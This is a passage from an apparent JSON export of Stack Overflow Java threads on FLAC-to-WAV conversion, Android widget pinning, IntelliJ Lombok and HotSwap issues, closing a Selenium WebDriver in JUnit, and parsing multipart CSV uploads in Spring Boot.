+&quot;';&quot;;\n        return getJdbcTemplate().queryForObject(sql, Integer.class);\n    } catch(EmptyResultDataAccessException e)\n    {\n        return 0;\n    } catch(Exception e)\n    {\n        System.out.println(e);\n        return 0;\n    }\n}\n</code></pre>\n"},{"tags":["java","wav","encoder","decoder","flac"],"answers":[{"tags":[],"owner":{"account_id":3557625,"reputation":198996,"user_id":2970947,"display_name":"Elliott Frisch"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1437528365,"creation_date":1437528365,"answer_id":31552373,"question_id":31552314,"body_markdown":"Use `flac -d` to (from the `man` page)\r\n\r\n&gt;     Decode (the default behavior is to encode)\r\n\r\nAnother option would be the [JustFLAC](https://github.com/drogatkin/JustFLAC) library, again you need to *decode* from FLAC. WAV is uncompressed audio.","title":"How to convert a FLAC file to WAV file using java?","body":"<p>Use <code>flac -d</code> to (from the <code>man</code> page)</p>\n\n<blockquote>\n<pre><code>Decode (the default behavior is to encode)\n</code></pre>\n</blockquote>\n\n<p>Another option would be the <a href=\"https://github.com/drogatkin/JustFLAC\" rel=\"nofollow\">JustFLAC</a> library, again you need to <em>decode</em> from FLAC. WAV is uncompressed audio.</p>\n"},{"tags":[],"owner":{"account_id":219877,"reputation":2148,"user_id":477008,"accept_rate":88,"display_name":"njlarsson"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683711872,"creation_date":1625900562,"answer_id":68325485,"question_id":31552314,"body_markdown":"One way would be to use the official FLAC code library. Of course, its API is not for Java but C/C++, but you can write a class using JNI that uses a tiny bit of C code to act as a bridge between the Java and native environments. [Here&#39;s a description for how to do that for FLAC decoding][1], and [here&#39;s a simple demo program][2] that converts a FLAC to a WAV using the [FLAC decoding library][3] described there.\r\n\r\n\r\n  [1]: https://klipspringer.avadeaux.net/decoding-the-flac-audio-format-in-java/\r\n  [2]: https://klipspringer.avadeaux.net/files/examples/FlacDecodeFile.java.html\r\n  [3]: https://klipspringer.avadeaux.net/guide/flac-decoding/","title":"How to convert a FLAC file to WAV file using java?","body":"<p>One way would be to use the official FLAC code library. Of course, its API is not for Java but C/C++, but you can write a class using JNI that uses a tiny bit of C code to act as a bridge between the Java and native environments. <a href=\"https://klipspringer.avadeaux.net/decoding-the-flac-audio-format-in-java/\" rel=\"nofollow noreferrer\">Here's a description for how to do that for FLAC decoding</a>, and <a href=\"https://klipspringer.avadeaux.net/files/examples/FlacDecodeFile.java.html\" rel=\"nofollow noreferrer\">here's a simple demo program</a> that converts a FLAC to a WAV using the <a href=\"https://klipspringer.avadeaux.net/guide/flac-decoding/\" rel=\"nofollow noreferrer\">FLAC decoding library</a> described there.</p>\n"}],"owner":{"account_id":3729166,"reputation":459,"user_id":3102124,"accept_rate":100,"display_name":"Kami"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1803,"favorite_count":0,"down_vote_count":2,"up_vote_count":2,"accepted_answer_id":31552373,"answer_count":2,"score":0,"last_activity_date":1683711872,"creation_date":1437527945,"question_id":31552314,"body_markdown":"I want to convert a given flac file to a wav file. Most of the questions on StackOverflow are the opposite of my question. Have anyone an idea how to solve this problem ? I heard something about JavaFlacEncoder [link][1] but I could not find a method to convert flac to wave. \r\n\r\n\r\n\r\n  [1]: http://sourceforge.net/projects/javaflacencoder/","title":"How to convert a FLAC file to WAV file using java?","body":"<p>I want to convert a given flac file to a wav file. Most of the questions on StackOverflow are the opposite of my question. Have anyone an idea how to solve this problem ? I heard something about JavaFlacEncoder <a href=\"http://sourceforge.net/projects/javaflacencoder/\" rel=\"nofollow\">link</a> but I could not find a method to convert flac to wave. </p>\n"},{"tags":["java","android","widget","android-widget","android-shortcut"],"owner":{"account_id":10916684,"reputation":3936,"user_id":8024296,"display_name":"Paul"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":28,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683711168,"creation_date":1683711168,"question_id":76216879,"body_markdown":"Is there a way to determine if the widget was pinned from the home or pinning shortcut?\r\n\r\nI would need that when the user tries to insert it from the home or from the pinning shortcut, he either doesn&#39;t allow it or opens the app to request a text and then allows the widget to be added.\r\n\r\nBeing that the use of the widget depends on this text and this text is passed via `Intent.ACTION_SEND`, if I don&#39;t have this text the widget cannot work.\r\n\r\nFor example how does `Gmail` o `Outlook` with its widget if you have more than one email.\r\n\r\nHome:\r\n\r\n[![enter image description here][1]][1]\r\n\r\nApp:\r\n\r\nMenu that appears by holding down the app icon for a long time, and then clicking on the word widget\r\n\r\n[![enter image description here][2]][2]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/BPnyb.png\r\n  [2]: https://i.stack.imgur.com/afVHH.png","title":"Android java widget determine if the widget was pinned from the home or pinning shortcut","body":"<p>Is there a way to determine if the widget was pinned from the home or pinning shortcut?</p>\n<p>I would need that when the user tries to insert it from the home or from the pinning shortcut, he either doesn't allow it or opens the app to request a text and then allows the widget to be added.</p>\n<p>Being that the use of the widget depends on this text and this text is passed via <code>Intent.ACTION_SEND</code>, if I don't have this text the widget cannot work.</p>\n<p>For example how does <code>Gmail</code> o <code>Outlook</code> with its widget if you have more than one email.</p>\n<p>Home:</p>\n<p><a href=\"https://i.stack.imgur.com/BPnyb.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/BPnyb.png\" alt=\"enter image description here\" /></a></p>\n<p>App:</p>\n<p>Menu that appears by holding down the app icon for a long time, and then clicking on the word widget</p>\n<p><a href=\"https://i.stack.imgur.com/afVHH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/afVHH.png\" alt=\"enter image description here\" /></a></p>\n"},{"tags":["java","unit-testing","intellij-idea","groovy","junit"],"comments":[{"owner":{"account_id":17092302,"reputation":9084,"user_id":12368154,"display_name":"Charchit Kapoor"},"score":0,"creation_date":1656562476,"post_id":72810188,"comment_id":128604540,"body_markdown":"if your project uses lombok, this might help https://github.com/projectlombok/lombok/issues/2842. Also updating Lombok might help","body":"if your project uses lombok, this might help <a href=\"https://github.com/projectlombok/lombok/issues/2842\" rel=\"nofollow noreferrer\">github.com/projectlombok/lombok/issues/2842</a>. Also updating Lombok might help"},{"owner":{"account_id":2273465,"reputation":15439,"user_id":2000323,"display_name":"Andrey"},"score":0,"creation_date":1656580365,"post_id":72810188,"comment_id":128609572,"body_markdown":"You should specify -Djps.track.ap.dependencies=true` to enable incremental annotation processing. Note that this may lead to incompatible build results. See [these links](https://youtrack.jetbrains.com/issue/IDEA-258659/Vertx-CodeGenProcessor-annotation-processor-is-no-longer-working-after-IDEA-upgrade#focus=Comments-27-4620217.0-0) more info about it.","body":"You should specify -Djps.track.ap.dependencies=true` to enable incremental annotation processing. Note that this may lead to incompatible build results. See <a href=\"https://youtrack.jetbrains.com/issue/IDEA-258659/Vertx-CodeGenProcessor-annotation-processor-is-no-longer-working-after-IDEA-upgrade#focus=Comments-27-4620217.0-0\" rel=\"nofollow noreferrer\">these links</a> more info about it."}],"answers":[{"tags":[],"owner":{"account_id":26458602,"reputation":137,"user_id":20100868,"display_name":"D.S."},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1664874103,"creation_date":1664874103,"answer_id":73945446,"question_id":72810188,"body_markdown":"I faced the same issue with intellij 2022 version. This issue occurs due to old lombok version like 1.16.16 or older. Update the lombok version to latest like 1.18.24. This version will resolve the error.\r\n\r\n        &lt;dependency&gt;\r\n            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n            &lt;version&gt;1.18.24&lt;/version&gt;\r\n        &lt;/dependency&gt;","title":"Intellij idea 2022.1.3 ultimate showing error java: JPS incremental annotation processing is disabled","body":"<p>I faced the same issue with intellij 2022 version. This issue occurs due to old lombok version like 1.16.16 or older. Update the lombok version to latest like 1.18.24. This version will resolve the error.</p>\n<pre><code>    &lt;dependency&gt;\n        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n        &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n        &lt;version&gt;1.18.24&lt;/version&gt;\n    &lt;/dependency&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10236560,"reputation":1324,"user_id":8420428,"display_name":"keith5140"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683710961,"creation_date":1683710961,"answer_id":76216857,"question_id":72810188,"body_markdown":"In my case, In my case, upgrading the version of the Lombok package did not work.\r\n\r\n    &lt;dependency&gt;\r\n        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n        &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n        &lt;version&gt;1.18.26&lt;/version&gt;\r\n    &lt;/dependency&gt;\r\n\r\nI suspect the cache problem or something, I use the invalid cache under the file and restart it several times, but it doesn’t work.\r\n\r\nFinally, the build runner turns on the delegate ide build/run actions to maven, and that&#39;s it. However, after it is turned on, it will be very slow when I run the project debug locally, and then turn it off again. Lombok did not report an error, so it was solved.\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/wjjn7.png","title":"Intellij idea 2022.1.3 ultimate showing error java: JPS incremental annotation processing is disabled","body":"<p>In my case, In my case, upgrading the version of the Lombok package did not work.</p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n    &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n    &lt;version&gt;1.18.26&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>I suspect the cache problem or something, I use the invalid cache under the file and restart it several times, but it doesn’t work.</p>\n<p>Finally, the build runner turns on the delegate ide build/run actions to maven, and that's it. However, after it is turned on, it will be very slow when I run the project debug locally, and then turn it off again. Lombok did not report an error, so it was solved.</p>\n<p><a href=\"https://i.stack.imgur.com/wjjn7.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wjjn7.png\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":371575,"reputation":13174,"user_id":720176,"accept_rate":75,"display_name":"Amit"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2129,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":73945446,"answer_count":2,"score":3,"last_activity_date":1683710961,"creation_date":1656561976,"question_id":72810188,"body_markdown":"I am using 2022.1.3 ultimate version and while running groovy test cases I am getting this error \r\n\r\n&gt; java: JPS incremental annotation processing is disabled. Compilation\r\n&gt; results on partial recompilation may be inaccurate. Use build process\r\n&gt; &quot;jps.track.ap.dependencies&quot; VM flag to enable/disable incremental\r\n&gt; annotation processing environment.\r\n\r\nDue to this error even running a single test takes lot of time. I have tried adding following option in shared build process VM options and also in run configuration but that is not helping.\r\n\r\n    -Djps.track.ap.dependencies=false \r\n\r\n Is anyone else noticing this same issue ?\r\n\r\nOriginal question, How to run a single groovy test case from a large project ? \r\n","title":"Intellij idea 2022.1.3 ultimate showing error java: JPS incremental annotation processing is disabled","body":"<p>I am using 2022.1.3 ultimate version and while running groovy test cases I am getting this error</p>\n<blockquote>\n<p>java: JPS incremental annotation processing is disabled. Compilation\nresults on partial recompilation may be inaccurate. Use build process\n&quot;jps.track.ap.dependencies&quot; VM flag to enable/disable incremental\nannotation processing environment.</p>\n</blockquote>\n<p>Due to this error even running a single test takes lot of time. I have tried adding following option in shared build process VM options and also in run configuration but that is not helping.</p>\n<pre><code>-Djps.track.ap.dependencies=false \n</code></pre>\n<p>Is anyone else noticing this same issue ?</p>\n<p>Original question, How to run a single groovy test case from a large project ?</p>\n"},{"tags":["java","intellij-idea","hotswap"],"comments":[{"owner":{"account_id":28411028,"reputation":416,"user_id":21734429,"display_name":"romanv-jb"},"score":0,"creation_date":1683556259,"post_id":76200893,"comment_id":134380653,"body_markdown":"Can you provide more details on what exactly was changed in the code and what was the expected result. Record a short video, maybe, if you can, or make a few more screenshots.\nLooking at your screenshot, it seems like it should have went as the video showed.","body":"Can you provide more details on what exactly was changed in the code and what was the expected result. Record a short video, maybe, if you can, or make a few more screenshots. Looking at your screenshot, it seems like it should have went as the video showed."},{"owner":{"account_id":16209003,"reputation":3,"user_id":11703519,"display_name":"bowen951209"},"score":0,"creation_date":1683628261,"post_id":76200893,"comment_id":134392361,"body_markdown":"Here&#39;s the video: https://youtu.be/AqWLAWZ-nBQ. I just made a new project, which is not the program I&#39;m working on, but It can show the problem.","body":"Here&#39;s the video: <a href=\"https://youtu.be/AqWLAWZ-nBQ\" rel=\"nofollow noreferrer\">youtu.be/AqWLAWZ-nBQ</a>. I just made a new project, which is not the program I&#39;m working on, but It can show the problem."}],"answers":[{"tags":[],"owner":{"account_id":27984139,"reputation":23,"user_id":21371358,"display_name":"aspGG"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683555093,"creation_date":1683555093,"answer_id":76201421,"question_id":76200893,"body_markdown":"&gt; Java IDEs and VMs support a feature called HotSwapping. It allows you to update the version of a class while the virtual machine is running, without needing to redeploy the webapp, restart, or otherwise interrupt your debugging session. (source: [source][1])\r\n\r\nBasically hot-swap updates your classes by reloading. As output says:\r\n&gt; 8 classes reloaded\r\n\r\nYour classes should be updated.\r\n\r\n  [1]: https://www.labkey.org/Documentation/wiki-page.view?name=hotSwapping#:~:text=Java%20IDEs%20and%20VMs%20support,otherwise%20interrupt%20your%20debugging%20session.","title":"Hot Swap in my IntelliJ doesn&#39;t work. What is wrong?","body":"<blockquote>\n<p>Java IDEs and VMs support a feature called HotSwapping. It allows you to update the version of a class while the virtual machine is running, without needing to redeploy the webapp, restart, or otherwise interrupt your debugging session. (source: <a href=\"https://www.labkey.org/Documentation/wiki-page.view?name=hotSwapping#:%7E:text=Java%20IDEs%20and%20VMs%20support,otherwise%20interrupt%20your%20debugging%20session.\" rel=\"nofollow noreferrer\">source</a>)</p>\n</blockquote>\n<p>Basically hot-swap updates your classes by reloading. As output says:</p>\n<blockquote>\n<p>8 classes reloaded</p>\n</blockquote>\n<p>Your classes should be updated.</p>\n"},{"tags":[],"owner":{"account_id":28411028,"reputation":416,"user_id":21734429,"display_name":"romanv-jb"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1683710340,"creation_date":1683706500,"answer_id":76216265,"question_id":76200893,"body_markdown":"In the video you are changing the method that is already being executed (main), if you create another method and call it from main HotSwap will work as you expect it to work.\r\n\r\nFor more info see [HotSwap Limitations][1] section.\r\n\r\nDCEVM can help you get around the limitations of the default HotSwap implementation.\r\nYou can check this [Plugin][2], for instance.\r\n\r\nHope this helps!\r\n\r\n\r\n  [1]: https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html#reload_classes\r\n  [2]: https://plugins.jetbrains.com/plugin/9552-hotswapagent","title":"Hot Swap in my IntelliJ doesn&#39;t work. What is wrong?","body":"<p>In the video you are changing the method that is already being executed (main), if you create another method and call it from main HotSwap will work as you expect it to work.</p>\n<p>For more info see <a href=\"https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html#reload_classes\" rel=\"nofollow noreferrer\">HotSwap Limitations</a> section.</p>\n<p>DCEVM can help you get around the limitations of the default HotSwap implementation.\nYou can check this <a href=\"https://plugins.jetbrains.com/plugin/9552-hotswapagent\" rel=\"nofollow noreferrer\">Plugin</a>, for instance.</p>\n<p>Hope this helps!</p>\n"}],"owner":{"account_id":16209003,"reputation":3,"user_id":11703519,"display_name":"bowen951209"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":389,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":76216265,"answer_count":2,"score":0,"last_activity_date":1683710340,"creation_date":1683551114,"question_id":76200893,"body_markdown":"I tried to use the hot swap function in IntelliJ. I followed this [video](https://www.youtube.com/watch?v=HV50Jzk4MM0).I changed some code in a method. Then, I clicked rebuild, and in the popped up dialog, I clicked &quot;reload&quot;, it only shown a dialog above the debug tab, telling me to stop the debug session. It did not change my running program. What&#39;s wrong?\r\n\r\nThis is the screenshot: It told me to stop debug session\r\n\r\n[![screenshot of problem][1]][1]\r\n\r\nI tried to follow the video. I expect my program will change while it&#39;s running, but it didn&#39;t.\r\n\r\n\r\nHere&#39;s my video showing what did I do: [video][2]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/dFjQC.png\r\n  [2]: https://youtu.be/AqWLAWZ-nBQ","title":"Hot Swap in my IntelliJ doesn&#39;t work. What is wrong?","body":"<p>I tried to use the hot swap function in IntelliJ. I followed this <a href=\"https://www.youtube.com/watch?v=HV50Jzk4MM0\" rel=\"nofollow noreferrer\">video</a>.I changed some code in a method. Then, I clicked rebuild, and in the popped up dialog, I clicked &quot;reload&quot;, it only shown a dialog above the debug tab, telling me to stop the debug session. It did not change my running program. What's wrong?</p>\n<p>This is the screenshot: It told me to stop debug session</p>\n<p><a href=\"https://i.stack.imgur.com/dFjQC.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/dFjQC.png\" alt=\"screenshot of problem\" /></a></p>\n<p>I tried to follow the video. I expect my program will change while it's running, but it didn't.</p>\n<p>Here's my video showing what did I do: <a href=\"https://youtu.be/AqWLAWZ-nBQ\" rel=\"nofollow noreferrer\">video</a></p>\n"},{"tags":["java","selenium-webdriver","junit","automated-tests"],"comments":[{"owner":{"account_id":12360572,"reputation":1730,"user_id":9014957,"accept_rate":17,"display_name":"pburgr"},"score":0,"creation_date":1683710217,"post_id":76216688,"comment_id":134406897,"body_markdown":"You need to add one `before` and one `after` annotations, see https://www.javatpoint.com/testng-annotations","body":"You need to add one <code>before</code> and one <code>after</code> annotations, see <a href=\"https://www.javatpoint.com/testng-annotations\" rel=\"nofollow noreferrer\">javatpoint.com/testng-annotations</a>"},{"owner":{"account_id":10495994,"reputation":1833,"user_id":7736228,"display_name":"Abhay Chaudhary"},"score":1,"creation_date":1683710309,"post_id":76216688,"comment_id":134406917,"body_markdown":"I don&#39;t think  the `finish()` method in above code is called at all ,there is no call to this method or are you calling it as part of teardown script,add a debug point in `finish()` method to check if it is being executed ,","body":"I don&#39;t think  the <code>finish()</code> method in above code is called at all ,there is no call to this method or are you calling it as part of teardown script,add a debug point in <code>finish()</code> method to check if it is being executed ,"},{"owner":{"account_id":28566140,"reputation":11,"user_id":21868995,"display_name":"MaughaS"},"score":0,"creation_date":1683712039,"post_id":76216688,"comment_id":134407341,"body_markdown":"Hi Abhay - you&#39;re correct I wasn&#39;t! If I wanted to call the finish method after it is set, how do I do that? I tried finish(); after googling but it isn&#39;t working","body":"Hi Abhay - you&#39;re correct I wasn&#39;t! If I wanted to call the finish method after it is set, how do I do that? I tried finish(); after googling but it isn&#39;t working"},{"owner":{"account_id":10495994,"reputation":1833,"user_id":7736228,"display_name":"Abhay Chaudhary"},"score":0,"creation_date":1683714470,"post_id":76216688,"comment_id":134407938,"body_markdown":"Annotate `@AfterMethod ` annotation to finish method, it should execute that\nThe annotated method will be run after each test","body":"Annotate <code>@AfterMethod </code> annotation to finish method, it should execute that The annotated method will be run after each test"},{"owner":{"account_id":28566140,"reputation":11,"user_id":21868995,"display_name":"MaughaS"},"score":0,"creation_date":1683715192,"post_id":76216688,"comment_id":134408078,"body_markdown":"@AbhayChaudhary I am using Junit - I know there&#39;s after and before but I don&#39;t have that setup currently for my test, was hoping to avoid. Thanks for your answer, back to the drawing board!","body":"@AbhayChaudhary I am using Junit - I know there&#39;s after and before but I don&#39;t have that setup currently for my test, was hoping to avoid. Thanks for your answer, back to the drawing board!"}],"answers":[{"tags":[],"owner":{"account_id":28490665,"reputation":66,"user_id":21803364,"display_name":"Tamas Demeny"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1683710331,"creation_date":1683710331,"answer_id":76216767,"question_id":76216688,"body_markdown":"As far as I can see, you are not running that method\r\nTry to use annotation `@AfterMethod` for the quit method\r\nLike this: \r\n\r\n    @AfterMethod\r\n    public void finish () {\r\n        driver.close();\r\n        driver.quit();\r\n        }","title":"Driver.quit() is not closing any of my tabs after my test is run","body":"<p>As far as I can see, you are not running that method\nTry to use annotation <code>@AfterMethod</code> for the quit method\nLike this:</p>\n<pre><code>@AfterMethod\npublic void finish () {\n    driver.close();\n    driver.quit();\n    }\n</code></pre>\n"}],"owner":{"account_id":28566140,"reputation":11,"user_id":21868995,"display_name":"MaughaS"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":103,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1683710331,"creation_date":1683709714,"question_id":76216688,"body_markdown":"I am running a test in Selenium with junit4 which opens multiple windows during the test. I then want to close the driver (all windows) after the test but for some reason this isn&#39;t working. I am new to java/junit and Selenium so apologies if the resolution is obvious\r\n\r\n        //I start the Webdriver here outside of my test\r\n\t    public WebDriver driver = TestContext.StartDriver(TestContext.getDashboardsUrlSaml());\r\n\r\n\r\n        //My test iterates around 7 times through parameters set (params not included in question)\t\r\n        @Test \r\n        public void login () throws InterruptedException, ParseException {\r\n\t    String currentHandle= driver.getWindowHandle();\r\n\t    Thread.sleep(2000);\r\n\t    java.util.Date date = (java.util.Date) new SimpleDateFormat(&quot;MM/dd/yyyy HH:mm:ss&quot;).parse(&quot;01/01/2030 00:00:00&quot;);  \r\n        //expirationTime\r\n\t\tCookie cookie = new Cookie(cookieName,content,&quot;rfqasv0003d.chicago.cme.com&quot;,&quot;/sso/accountstatus&quot;,date,true);\r\n\t\tdriver.manage().addCookie(cookie);\r\n\t    Thread.sleep(1000);\r\n\t    System.out.println(&quot;Cookie has been added for: &quot; + role);\r\n\r\n        driver.findElement(By.id(&quot;user&quot;)).sendKeys(username);\r\n\t    driver.findElement(By.id(&quot;pwd&quot;)).sendKeys(password);\r\n\t    driver.findElement(By.id(&quot;loginBtn&quot;)).click();\r\n\t    \r\n\t    System.out.println(&quot;Logged in successfully for: &quot; + role);\r\n\t    Thread.sleep(1000);\r\n\t    \r\n\t    System.out.println(&quot;The dashboards required for &quot; + role +&quot; are: &quot; + dashboards);\r\n\t    Thread.sleep(1000);\r\n\t   \r\n\t    String[] reqDashboards = dashboards.split(&quot;\\\\|&quot;);     \r\n\t    List&lt;String&gt; requiredDash = Arrays.asList(reqDashboards);\t    \r\n\t    \r\n\t    Thread.sleep(2000);\r\n\t    Select select = new Select(driver.findElement(By.xpath(&quot;//div[@class=&#39;document-selector&#39;]/select&quot;)));\r\n\t    List&lt;WebElement&gt; options = select.getOptions();\r\n\t    \r\n\t    ArrayList&lt;String&gt; displayedDash = new ArrayList&lt;String&gt;(); \r\n\t    \r\n\t    for (WebElement visibleDash: options) {\r\n\t    \tString visDash = visibleDash.getText();\r\n\t    \tdisplayedDash.add(visDash);\r\n\t    }\t\r\n\t    \t \r\n\t    System.out.println(&quot;The dashboards displayed are: &quot; + displayedDash);\r\n\t    System.out.println(&quot;Count of dashboards visible is: &quot; + displayedDash.size());\r\n\t    \r\n\t    assertEquals(requiredDash.size(), displayedDash.size());\r\n\t    assertTrue(requiredDash.containsAll(displayedDash));\r\n\t    assertTrue(displayedDash.containsAll(requiredDash));\r\n\t    \t\r\n\t    //logout\r\n\t\tdriver.findElement(By.className(&quot;user-name&quot;)).click();\r\n\t\tdriver.findElement(By.id(&quot;ui-id-5&quot;)).click();\r\n\t\t\r\n\t\tdriver.switchTo().window(currentHandle);\r\n\t\t\r\n\t    }\t\r\n\r\n    //This is where I&#39;m trying to close my driver\r\n    //My test is running with no errors however my driver stays open after the test has been run\t\t\r\n        public void finish () {\r\n\t    driver.quit();\r\n        }\r\n\t\t\t\r\n    }\r\n\r\n","title":"Driver.quit() is not closing any of my tabs after my test is run","body":"<p>I am running a test in Selenium with junit4 which opens multiple windows during the test. I then want to close the driver (all windows) after the test but for some reason this isn't working. I am new to java/junit and Selenium so apologies if the resolution is obvious</p>\n<pre><code>    //I start the Webdriver here outside of my test\n    public WebDriver driver = TestContext.StartDriver(TestContext.getDashboardsUrlSaml());\n\n\n    //My test iterates around 7 times through parameters set (params not included in question)  \n    @Test \n    public void login () throws InterruptedException, ParseException {\n    String currentHandle= driver.getWindowHandle();\n    Thread.sleep(2000);\n    java.util.Date date = (java.util.Date) new SimpleDateFormat(&quot;MM/dd/yyyy HH:mm:ss&quot;).parse(&quot;01/01/2030 00:00:00&quot;);  \n    //expirationTime\n    Cookie cookie = new Cookie(cookieName,content,&quot;rfqasv0003d.chicago.cme.com&quot;,&quot;/sso/accountstatus&quot;,date,true);\n    driver.manage().addCookie(cookie);\n    Thread.sleep(1000);\n    System.out.println(&quot;Cookie has been added for: &quot; + role);\n\n    driver.findElement(By.id(&quot;user&quot;)).sendKeys(username);\n    driver.findElement(By.id(&quot;pwd&quot;)).sendKeys(password);\n    driver.findElement(By.id(&quot;loginBtn&quot;)).click();\n    \n    System.out.println(&quot;Logged in successfully for: &quot; + role);\n    Thread.sleep(1000);\n    \n    System.out.println(&quot;The dashboards required for &quot; + role +&quot; are: &quot; + dashboards);\n    Thread.sleep(1000);\n   \n    String[] reqDashboards = dashboards.split(&quot;\\\\|&quot;);     \n    List&lt;String&gt; requiredDash = Arrays.asList(reqDashboards);       \n    \n    Thread.sleep(2000);\n    Select select = new Select(driver.findElement(By.xpath(&quot;//div[@class='document-selector']/select&quot;)));\n    List&lt;WebElement&gt; options = select.getOptions();\n    \n    ArrayList&lt;String&gt; displayedDash = new ArrayList&lt;String&gt;(); \n    \n    for (WebElement visibleDash: options) {\n        String visDash = visibleDash.getText();\n        displayedDash.add(visDash);\n    }   \n         \n    System.out.println(&quot;The dashboards displayed are: &quot; + displayedDash);\n    System.out.println(&quot;Count of dashboards visible is: &quot; + displayedDash.size());\n    \n    assertEquals(requiredDash.size(), displayedDash.size());\n    assertTrue(requiredDash.containsAll(displayedDash));\n    assertTrue(displayedDash.containsAll(requiredDash));\n        \n    //logout\n    driver.findElement(By.className(&quot;user-name&quot;)).click();\n    driver.findElement(By.id(&quot;ui-id-5&quot;)).click();\n    \n    driver.switchTo().window(currentHandle);\n    \n    }   \n\n//This is where I'm trying to close my driver\n//My test is running with no errors however my driver stays open after the test has been run        \n    public void finish () {\n    driver.quit();\n    }\n        \n}\n</code></pre>\n"},{"tags":["java","spring-boot","csv","spring-data-jpa","java-io"],"owner":{"account_id":10981964,"reputation":43,"user_id":8068792,"accept_rate":0,"display_name":"Prabhash Mishra"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":169,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683709734,"creation_date":1683709251,"question_id":76216623,"body_markdown":"I am reading and validating data stored in .csv file in springboot.I am able to get the content of .csv file. Also I want to validate the data stored in file for that I need some extra attribute apart from file content. If I am uploading file from web page I can see the extra attributes needed . But If I uploading file from postman only file content is coming not the other required attribute. Its migration work where I am migrating code from .net to java. If I am uploading file through .NET web from I am getting below content which includes .csv file contents and other attribute but while developing same in Java through postman i can see the content of .csv file which is highlighted under RED line.\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/Cy7dk.png\r\n\r\nFor validating .csv data I am using below java code including regular expression.\r\n\r\n\r\n\r\n\r\n```\r\npublic class MultipartParser {\r\n   // private static final Logger logger = LogManager.getLogger(MultipartParser.class);\r\n\r\n    public boolean success = false;\r\n    public String name;\r\n    public  String variableType;\r\n    public String taxelid;\r\n    public String text;\r\n    public String contentType;\r\n    public String fileName;\r\n\r\n    public boolean ignoreFirstLine;\r\n\r\n    public MultipartParser(){}\r\n    public MultipartParser(MultipartFile stream){\r\n        this.parse(stream);\r\n    }\r\n    public void parse(MultipartFile stream) {\r\n        ///logger.info(&quot;Inside parser&quot;);\r\n\r\n        try {\r\n            String content = new String(stream.getBytes(), StandardCharsets.UTF_8);\r\n            System.out.println(&quot;CONTENT::&quot;+content);\r\n            int delimiterEndIndex = content.indexOf(&quot;\\r\\n&quot;);\r\n\r\n            if (delimiterEndIndex &gt; -1)\r\n            {\r\n                String delimiter = content.substring(0, content.indexOf(&quot;\\r\\n&quot;));\r\n                // Look for Content-Type\r\n                Pattern re = Pattern.compile(&quot;(?&lt;=Content\\\\-Type:)(.*?)(?=\\r\\n\\r\\n)&quot;);\r\n                Matcher contentTypeMatch = re.matcher(content);\r\n\r\n                // Look for filename\r\n                re = Pattern.compile(&quot;(?&lt;=filename\\\\=\\&quot;\\&quot;)(.*?)(?=\\&quot;\\&quot;)&quot;);\r\n                Matcher filenameMatch = re.matcher(content);\r\n\r\n                // Look for variable\r\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;variable\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\r\n                Matcher variableMatch = re.matcher(content);\r\n\r\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;taxelid\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\r\n                Matcher taxelidMatch = re.matcher(content);\r\n\r\n                // Look for name\r\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;cgname\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\r\n                Matcher cgnameMatch = re.matcher(content);\r\n\r\n                re = 